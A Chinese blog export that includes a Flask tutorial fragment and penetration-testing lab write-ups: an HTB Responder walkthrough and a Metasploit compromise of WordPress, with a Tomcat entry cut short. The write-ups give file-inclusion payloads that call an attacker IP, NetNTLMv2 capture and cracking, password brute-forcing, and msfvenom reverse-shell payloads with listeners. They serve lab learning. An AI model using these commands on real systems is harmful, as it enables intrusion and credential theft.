&lt;body&gt;</span><br><span class="line">      &lt;form action = <span class="string">&quot;http://localhost:5000/login&quot;</span> method = <span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">         &lt;p&gt;Enter Name:&lt;/p&gt;</span><br><span class="line">         &lt;p&gt;&lt;<span class="built_in">input</span> <span class="built_in">type</span> = <span class="string">&quot;text&quot;</span> name = <span class="string">&quot;nm&quot;</span> /&gt;&lt;/p&gt;</span><br><span class="line">         &lt;p&gt;&lt;<span class="built_in">input</span> <span class="built_in">type</span> = <span class="string">&quot;submit&quot;</span> value = <span class="string">&quot;submit&quot;</span> /&gt;&lt;/p&gt;</span><br><span class="line">      &lt;/form&gt;</span><br><span class="line">   &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>现在在python shell中输入以下脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, redirect, url_for, request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/success/&lt;name&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">success</span>(<span class="params">name</span>):</span><br><span class="line">   <span class="keyword">return</span> <span class="string">&#x27;welcome %s&#x27;</span> % name</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods = [<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">   <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">      user = request.form[<span class="string">&#x27;nm&#x27;</span>]</span><br><span class="line">      <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;success&#x27;</span>,name = user))</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">      user = request.args.get(<span class="string">&#x27;nm&#x27;</span>)</span><br><span class="line">      <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;success&#x27;</span>,name = user))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">   app.run(debug = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>表单数据被发布到表单标签的 action 子句中的 URL。</p><p><strong><a href="http://localhost/login">http://localhost/login</a></strong> 映射到 <strong>login()</strong> 函数。 由于服务器已通过<strong>POST</strong>方法接收数据，从表单数据中获取的’nm’参数的值通过以下方式获取 −</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user = request.form[<span class="string">&#x27;nm&#x27;</span>]</span><br></pre></td></tr></table></figure><p>它作为可变部分传递给 <strong>‘/success’</strong> URL。 浏览器在窗口中显示一条<strong>Welcome</strong>消息</p><p>在<strong>login.html</strong>中将method参数改为**’GET’<strong>，然后在浏览器中再次打开。 服务器上接收的数据是通过</strong>GET** 方法。 “nm”参数的值现在通过以下方式获得 −</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User = request.args.get(‘nm’)</span><br></pre></td></tr></table></figure></blockquote><h2 id="flask-模板"><a href="#flask-模板" class="headerlink" title="flask - 模板"></a>flask - 模板</h2><p>详细的介绍：<a href="https://w3schools.cn/flask/flask_templates.html">Flask - 模板 (w3schools.cn)</a></p><p>以下是一个例子：</p><blockquote><p>　　当运行如下代码时，Flask 将尝试在 templates 文件夹中查找 HTML 文件，该文件夹与此脚本所在的文件夹相同。</p><p>　- application folder<br>　    - hello.py<br>　    - templates<br>　        - hello.html</p><p>　<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">　<span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">　app = Flask(__name__)</span><br><span class="line">　</span><br><span class="line">　@app.route(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">　<span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">　   <span class="keyword">return</span> render_template(‘hello.html’)</span><br><span class="line">　</span><br><span class="line">　<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">　   app.run(debug = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure></p><p>　 <strong>render_template()</strong> 函数可以呈现 HTML 文件</p></blockquote><p>术语**”网络模板系统”**是指设计一个可以动态插入可变数据的HTML脚本。 Web 模板系统由模板引擎、某种数据源和模板处理器组成。</p><p>Flask 使用 <strong>jinja2</strong> 模板引擎。 Web 模板包含用于变量和表达式（在本例中为 Python 表达式）的 HTML 语法散布占位符，这些占位符在呈现模板时被替换值。</p><p>再来看一个例子：</p><blockquote><p>以下代码在模板文件夹中保存为 <strong>hello.html</strong>。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">   </span><br><span class="line">      <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello &#123;&#123; name &#125;&#125;!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">      </span><br><span class="line">   <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后用python3运行以下代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello/&lt;user&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_name</span>(<span class="params">user</span>):</span><br><span class="line">   <span class="keyword">return</span> render_template(<span class="string">&#x27;hello.html&#x27;</span>, name = user)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">   app.run(debug = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>当开发服务器开始运行时，打开浏览器并输入 URL 作为 − <strong><a href="http://localhost:5000/hello/mvl">http://localhost:5000/hello/mvl</a></strong></p><p>URL 的 <strong>variable</strong> 部分会插入到 <strong></strong> 占位符处。</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20231008195716264.png" alt="image-20231008195716264"></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 小寄巧 </category>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>htb - responder</title>
      <link href="/2023/09/15/htb%E9%9D%B6%E6%9C%BA%E8%AE%B0%E5%BD%95/responder/"/>
      <url>/2023/09/15/htb%E9%9D%B6%E6%9C%BA%E8%AE%B0%E5%BD%95/responder/</url>
      
        <content type="html"><![CDATA[<h1 id="htb-responder"><a href="#htb-responder" class="headerlink" title="htb - responder"></a>htb - responder</h1><blockquote><p>htb walkthrough原文：</p><p>本实验的重点是如何利用Windows机器上的网页上的文件包含漏洞来收集正在运行web服务器的用户的NetNTLMv2挑战。我们将使用一个名为Responder的实用程序来捕获NetNTLMv2散列，然后使用一个名为john the ripper的实用程序测试数以百万计的潜在密码，看看它们是否与用于创建散列的密码匹配。我们还将深入研究NTLM身份验证的工作过程，以及Responder实用程序如何捕获挑战。我们认为，理解工具或框架的底层工作原理是至关重要的，因为它加强了人们理解的基础，这有助于人们在现实世界中可能面临的利用场景，这些场景乍一看并不容易受到攻击。让我们直奔主题。</p></blockquote><h2 id="攻击流程及思路"><a href="#攻击流程及思路" class="headerlink" title="攻击流程及思路"></a>攻击流程及思路</h2><h3 id="扫描靶机开放端口和相应的服务"><a href="#扫描靶机开放端口和相应的服务" class="headerlink" title="扫描靶机开放端口和相应的服务"></a>扫描靶机开放端口和相应的服务</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- --min-rate <span class="number">1000</span> -sV <span class="number">10</span>.<span class="number">129</span>.<span class="number">58</span>.<span class="number">87</span></span><br></pre></td></tr></table></figure><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230914193416277.png" alt="image-20230914193416277"></p><p>根据Nmap扫描的结果，该机器正在使用Windows作为其操作系统。检测到两个端口打开，其中Apache web服务器在端口80上运行，WinRM在端口5985上运行。</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/%E6%89%AB%E6%8F%8F%E7%BB%93%E6%9E%9C.png" alt="扫描结果"></p><blockquote><p>Windows远程管理(WinRM)是Windows自带的内置远程管理协议，它基本上使用简单对象访问协议与远程计算机和服务器以及操作系统和应用程序进行交互。</p><p>WinRM允许用户:</p><ul><li>通过接口与主机进行远程通信</li><li>在通过网络访问的系统上远程执行命令。</li><li>远程监控、管理和配置服务器、操作系统和客户端机器。</li></ul><p>作为一名渗透测试人员，这意味着如果我们能够找到具有远程管理权限的用户的凭据(通常是用户名和密码)，我们就有可能在主机上获得PowerShell shell。</p></blockquote><p>关注点：</p><ul><li>80    ——    http服务</li><li>5985    ——    winRM windows远程管理         </li></ul><h3 id="尝试http访问靶机"><a href="#尝试http访问靶机" class="headerlink" title="尝试http访问靶机"></a>尝试http访问靶机</h3><ul><li>在浏览器输入目标机器ip</li><li>发现被重定向到unika.htb，并显示连接失败</li></ul><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230914195008565.png" alt="image-20230914195008565"></p><p>这是打htb靶场常遇到的问题。</p><p>当访问此ip时此网站将浏览器重定向到一个新的url ”unika.htb”，而此时我们的机器不知道怎么找到这个网站。此时需要修改我们的 “/etc/hosts” 文件，将靶机ip和这个新的url绑定起来。（/etc/hosts文件用于将主机名解析为ip地址）</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230914195629580.png" alt="image-20230914195629580"></p><p>重新访问此ip</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230914195705065.png" alt="image-20230914195705065"></p><p>访问成功</p><h3 id="检查网页是否存在明显的问题"><a href="#检查网页是否存在明显的问题" class="headerlink" title="检查网页是否存在明显的问题"></a>检查网页是否存在明显的问题</h3><p>点击网页的每个按钮 最终发现在语言选项这里存在一定问题</p><p>在选择法语选项时，观察到url变为了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://unika.htb/index.php?page=french.html</span><br></pre></td></tr></table></figure><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230914200708364.png" alt="image-20230914200708364"></p><blockquote><p>注意到URL，我们可以看到french.html页面是由page参数加载的，如果页面输入没有经过清理，那么它可能容易受到本地文件包含(Local File Inclusion, LFI)漏洞的攻击。</p></blockquote><h4 id="漏洞成因——php危险函数include"><a href="#漏洞成因——php危险函数include" class="headerlink" title="漏洞成因——php危险函数include()"></a>漏洞成因——php危险函数include()</h4><blockquote><p> 函数作用：包含并运行指定的文件，包含文件发生错误时，程序警告，但会继续执行。</p></blockquote><p>本例存在这个漏洞的原因是 该网站后端URL参数处理页采用 include() 函数，借此为不同的语言提供不同的网页。由于没有对这个页面参数进行适当的处理，我们能够传递恶意输入从而查看内部系统的文件。</p><h3 id="测试可能存在的漏洞"><a href="#测试可能存在的漏洞" class="headerlink" title="测试可能存在的漏洞"></a>测试可能存在的漏洞</h3><p>渗透测试人员可能尝试访问Windows机器上最常见的文件之一 —— hosts文件 来验证LFl</p><p>C:\windows\system32\drivers\etc\hosts(该文件有助于将主机名本地转换为IP地址)。</p><p>LFI测试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://unika.htb/index.php?page=../../../../../../../../../../../../windows/system32/drivers/etc/hosts</span><br></pre></td></tr></table></figure><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230915111255236.png" alt="image-20230915111255236"></p><p>经测试此靶机存在LFI，推测该靶机 php.ini 文件的 “allow_url_include” 一项被设置为 “On”，因此可能允许远程文件包含</p><p>测试远程文件包含：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://unika.htb/index.php?page=//10.10.16.40/somefile</span><br></pre></td></tr></table></figure><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230915143219279.png" alt="image-20230915143219279"></p><p>验证成功</p><h3 id="借助responder工具捕获NetNTLMv2"><a href="#借助responder工具捕获NetNTLMv2" class="headerlink" title="借助responder工具捕获NetNTLMv2"></a>借助responder工具捕获NetNTLMv2</h3><h4 id="什么是NTLM-新技术局域网管理"><a href="#什么是NTLM-新技术局域网管理" class="headerlink" title="什么是NTLM(新技术局域网管理)?"></a>什么是NTLM(新技术局域网管理)?</h4><p>NTLM是由Microsoft创建的身份验证协议集合。它是一种 “challenge-response” 身份验证协议，用于向Active Directory域上的资源验证客户端。</p><blockquote><ol><li>客户端将用户名和域名发送给服务器。</li><li>服务器生成一个随机字符串，称为质询。</li><li>客户端使用用户密码的NTLM散列和收到的质询进行加密（这个过程有点像hash算法），并将其发送回服务器。</li><li>服务器检索用户密码。</li><li>服务器使用从安全帐户数据库检索的哈希值来加密质询字符串。然后将该值与从客户机接收到的值进行比较。如果两个值匹配，则通过认证。<img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/NTLM.png" alt="NTLM"></li></ol></blockquote><h4 id="什么是NetNTLMv2"><a href="#什么是NetNTLMv2" class="headerlink" title="什么是NetNTLMv2"></a>什么是NetNTLMv2</h4><p>NetNTLMv2是NTLM的 质询 或 响应 经过特别格式化的字符串。</p><p>以下是一个NetNTLMv2的例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[SMB] NTLMv2-SSP Client   : 10.129.168.12</span><br><span class="line">[SMB] NTLMv2-SSP Username : RESPONDER\Administrator</span><br><span class="line">[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:703b7f937c48981fspan><br></pre></td></tr></table></figure><p>使用工具responder 输入如下命令</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">responder -I tun0</span><br></pre></td></tr></table></figure><p>这个命令会启动responder比你高监听本地的tun0网卡，然后等待并捕获特定的网络流量或者连接请求。</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230915130415864.png" alt="image-20230915130415864"></p><p>然后在浏览器输入（这里的ip地址是攻击机的IP地址）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://unika.htb/index.php?page=//10.10.16.40/somefile</span><br></pre></td></tr></table></figure><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230915133122000.png" alt="image-20230915133122000"></p><p>此时靶机会向攻击机请求”somefile“这个文件。对于这种情况，responder会设置一个恶意的smb服务器，诱导靶机对这个恶意的服务器执行NTLM身份验证，过程如下：</p><ol><li>靶机将用户名和域名发送给恶意服务器</li><li>恶意服务器生成一个随机的字符串（质询）发送回靶机</li><li>靶机将用户名对应的密码和收到的 ”质询“ 进行加密发送回恶意的服务器（响应）</li></ol><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/%E6%81%B6%E6%84%8F%E6%9C%8D%E5%8A%A1%E5%99%A8.png" alt="恶意服务器"></p><p>如此，responder就能通过 质询和响应 生成NetNTLMv2了。（NetNTLMv2中包含了质询和加密响应的信息）</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230915133058642.png" alt="image-20230915133058642"></p><p>靶机的密码经过加密能生成Net‘NTLMv2。但是，知道NetNTLMv2并不能逆推得到原来的密码。</p><p>生成NetNTLMv2的算法是不可逆的，虽然我们不能逆转NetNTLMv2，但是我们可以尝试使用许多不同的字符串，看看是否有哪个能生成相同的NetNTLMv2，如果有，那个字符串就是密码。</p><p>这个方法被称为hash cracking，可以借助kali中的 John The Ripper 来完成这个工作</p><h3 id="使用-John-The-Ripper-暴力破解密码"><a href="#使用-John-The-Ripper-暴力破解密码" class="headerlink" title="使用 John The Ripper 暴力破解密码"></a>使用 John The Ripper 暴力破解密码</h3><p>将哈希文件传递给john并破解Administrator帐户的密码。散列类型由john命令行工具自动识别</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john -w=/usr/share/wordlists/rockyou.txt hash.txt</span><br></pre></td></tr></table></figure><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230915143904935.png" alt="image-20230915143904935"></p><p>最终得到 administrator 的密码：badminton</p><h3 id="使用evil-winRM远程连接靶机"><a href="#使用evil-winRM远程连接靶机" class="headerlink" title="使用evil-winRM远程连接靶机"></a>使用evil-winRM远程连接靶机</h3><p>Evil-winRM是一个linux机器用于远程连接windows机器的工具</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i <span class="number">10</span>.<span class="number">129</span>.<span class="number">168</span>.<span class="number">12</span> -u administrator -p badminton</span><br></pre></td></tr></table></figure><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230915134805198.png" alt="image-20230915134805198"></p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230915135448206.png" alt="image-20230915135448206"></p><p>最终在 “C:\Users\mike\desktop” 找到flag</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230915135552352.png" alt="image-20230915135552352"></p><p>借助evil-winrm下载文件（练练手）</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">download flag.txt thisflag.txt</span><br></pre></td></tr></table></figure><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230915135800039.png" alt="image-20230915135800039"></p><p>查看flag内容</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230915135900232.png" alt="image-20230915135900232"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>借助nmap扫描靶机，确定开放端口及对应服务</li><li>根据开放的端口，确定着手点 <ul><li>web漏洞</li><li>windows远程连接</li></ul></li><li>访问目标网站，检查可能存在的漏洞 <ul><li>本地文件包含（LFI）</li><li>远程文件包含（RFI）</li></ul></li><li>对漏洞进行验证 —— 验证成功</li><li>利用漏洞  <ul><li>开启responder监听vpn网卡</li><li>修改URL使靶机试图访问攻击机并加载文件</li><li>responder诱导靶机进行身份验证并借此获得靶机用户名和加密后的密码信息</li></ul></li><li>破解密码<ul><li>借助john进行哈希碰撞，暴力破解得到靶机的密码</li></ul></li><li>远程连接靶机</li><li>找到flag</li></ul>]]></content>
      
      
      <categories>
          
          <category> 打靶 </category>
          
          <category> htb - responder </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 打靶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>msf渗透wordpress博客</title>
      <link href="/2023/07/26/%E5%AE%89%E5%85%A8%E5%85%8D%E6%9D%80/msf%E6%B8%97%E9%80%8Fwordpress/"/>
      <url>/2023/07/26/%E5%AE%89%E5%85%A8%E5%85%8D%E6%9D%80/msf%E6%B8%97%E9%80%8Fwordpress/</url>
      
        <content type="html"><![CDATA[<h2 id="msf渗透wordpress博客"><a href="#msf渗透wordpress博客" class="headerlink" title="msf渗透wordpress博客"></a>msf渗透wordpress博客</h2><blockquote><p>WordPress是一款能帮助建立网站、博客或应用程序的开源软件。</p></blockquote><h3 id="此类软件可能存在漏洞的地方"><a href="#此类软件可能存在漏洞的地方" class="headerlink" title="此类软件可能存在漏洞的地方"></a>此类软件可能存在漏洞的地方</h3><ul><li>程序本身</li><li>插件</li><li>主题 theme</li></ul><h3 id="使用wpscan爆破用户名和密码进行登录"><a href="#使用wpscan爆破用户名和密码进行登录" class="headerlink" title="使用wpscan爆破用户名和密码进行登录"></a>使用wpscan爆破用户名和密码进行登录</h3><h4 id="扫描用户名"><a href="#扫描用户名" class="headerlink" title="扫描用户名"></a>扫描用户名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.3.7:8081/wordpress --enumerate u</span><br></pre></td></tr></table></figure><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230713225250726.png" alt="image-20230713225250726"></p><p>这里找到一个用户：admin</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230713225321863.png" alt="image-20230713225321863"></p><h4 id="利用密码字典暴力破解密码"><a href="#利用密码字典暴力破解密码" class="headerlink" title="利用密码字典暴力破解密码"></a>利用密码字典暴力破解密码</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">7</span>:<span class="number">8081</span>/wordpress -U admin -P /root/pw.txt</span><br></pre></td></tr></table></figure><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230713230723669.png" alt="image-20230713230723669"></p><p>成功，用户admin的密码为123456，可以登录并进入网站的后台了</p><p>由于此时仍处于web端，下一步的目的是去到服务器的操作系统执行命令</p><p>下一步：文件上传，反弹shell</p><blockquote><p>思路一、 正向连接，找上传点，上传一句话木马</p><p>然而正向连接往往有局限性：</p><ul><li>目标机器开了防火墙（入的端口关闭，出的端口打开）</li><li>目标机器是内网机器，没有公网ip（攻击机不能访问，而目标机器可以访问其他机器）</li><li>目标机器IP是动态变化的</li></ul><p>以上三种情况都不适用于正向连接</p><p>思路二、 反弹连接——msf登场！</p><p>msf工具的msfvenom模块可以生成反弹连接的木马并监听其他机器连接</p></blockquote><h3 id="借助msf的meterpreter进行反弹连接"><a href="#借助msf的meterpreter进行反弹连接" class="headerlink" title="借助msf的meterpreter进行反弹连接"></a>借助msf的meterpreter进行反弹连接</h3><blockquote><p>注意到wordpress是一个用php写的博客平台，而且存在web端修改服务器中文件的漏洞</p></blockquote><p>使用msf的msfvenom模块生成反弹连接的木马</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=<span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">19</span> lport=<span class="number">7777</span> -o shell.php</span><br></pre></td></tr></table></figure><blockquote><p>这里使用的payload是php/meterpreter/reverse_tcp</p></blockquote><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230714153611610.png" alt="image-20230714153611610"></p><p>查看生成的木马内容</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat shell.php</span><br></pre></td></tr></table></figure><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230714153634513.png" alt="image-20230714153634513"></p><p>利用wordpress的文件修改漏洞，点击wordpress的主题编辑器功能，把随便一个php文件修改成刚刚生成的木马</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230714153308676.png" alt="image-20230714153308676"></p><p>使用msf中的 exploit/multi/handler 模块开启监听端口等待目标机器连接:</p><p>首先选择此模块</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br></pre></td></tr></table></figure><p>然后修改payload为 刚刚生成木马所使用的payload</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><blockquote><p>这个模块所使用的payload默认为 generic/shell_reverse_tcp</p><p>注意所使用的payload要与木马相对应，因此需要修改</p></blockquote><p>设置监听的主机ip和端口号</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230714154443011.png" alt="image-20230714154443011"></p><p>启动，等待目标机器上钩</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230714154843780.png" alt="image-20230714154843780"></p><p>假设目标机器访问了404页面，就会执行木马程序，访问攻击机。此时msf会监听到连接，开启meterpreter。至此客户端与服务端建立加密的连接通信。</p><h4 id="meterpreter常用命令"><a href="#meterpreter常用命令" class="headerlink" title="meterpreter常用命令"></a>meterpreter常用命令</h4><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230714155153944.png" alt="image-20230714155153944"></p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230714161840363.png" alt="image-20230714161840363"></p><ul><li><p>使用sysinfo命令查看被控制的机器系统信息</p><p>  <img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230714155414206.png"></p></li><li><p>使用getuid查看用户信息</p><p>  <img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230714160022378.png" alt="image-20230714160022378"></p></li><li><p>使用pwd查看当前目录</p><p>  <img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230714160043210.png" alt="image-20230714160043210"></p></li><li><p>使用cd切换目录</p><p>  <img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230714162945807.png" alt="image-20230714162945807"></p></li></ul><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><ul><li><p>msf爆破tomcat并获得shell</p></li><li><p>msf利用ubuntu内核漏洞提权</p></li><li><p>msf渗透流程总结</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 免杀技术 </category>
          
          <category> msf实践案例 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免杀技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>msf爆破tomcat</title>
      <link href="/2023/07/26/%E5%AE%89%E5%85%A8%E5%85%8D%E6%9D%80/msf%E7%88%86%E7%A0%B4tomcat/"/>
      <url>/2023/07/26/%E5%AE%89%E5%85%A8%E5%85%8D%E6%9D%80/msf%E7%88%86%E7%A0%B4tomcat/</url>
      
        <content type="html"><![CDATA[<h1 id="msf爆破tomcat"><a href="#msf爆破tomcat" class="headerlink" title="msf爆破tomcat"></a>msf爆破tomcat</h1><blockquote><p><strong><a href="https://tomcat.apache.org/">Tomcat</a>是一款Apache下面的开源的Servlet容器，实现了对Servlet和JSP规范的支持</strong>。另外 <strong>Tomcat</strong> 本身内含了一个 HTTP 服务器，所以也可以被当作一个 Web 服务器来使用。但是Tomcat作为一个Web服务器，它对静态资源的处理能力要比Apache或者Nginx这类的Web服务器差很多，所以我们经常将Apache和Tomcat（或者是Nginx和Tomcat）组合使用，Apache来充当Web服务器处理静态资源的请求，Tomcat充当Servlet容器来处理动态请求。</p></blockquote><blockquote><p>Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。</p></blockquote><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230804190245109.png" alt="image-20230804190245109"></p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230726121534414.png" alt="image-20230726121534414"></p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ul><li>找到后台管理界面</li><li>使用 auxiliary/scanner/http/tomcat_mgr_login 模块爆破后台密码</li><li>利用msf毒液制作java木马: msfvenom -p java/meterpreter/reverse_tcp lhost=x.x.x.x lport=x -f war -o kali.war</li><li>利用tomcat管理后台上传java木马</li></ul><h3 id="找到后台管理界面"><a href="#找到后台管理界面" class="headerlink" title="找到后台管理界面"></a>找到后台管理界面</h3><p>确认ip地址、端口</p><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230726120008190.png" alt="image-20230726120008190"></p><h3 id="使用tomcat后台爆破模块爆破后台登录密码"><a href="#使用tomcat后台爆破模块爆破后台登录密码" class="headerlink" 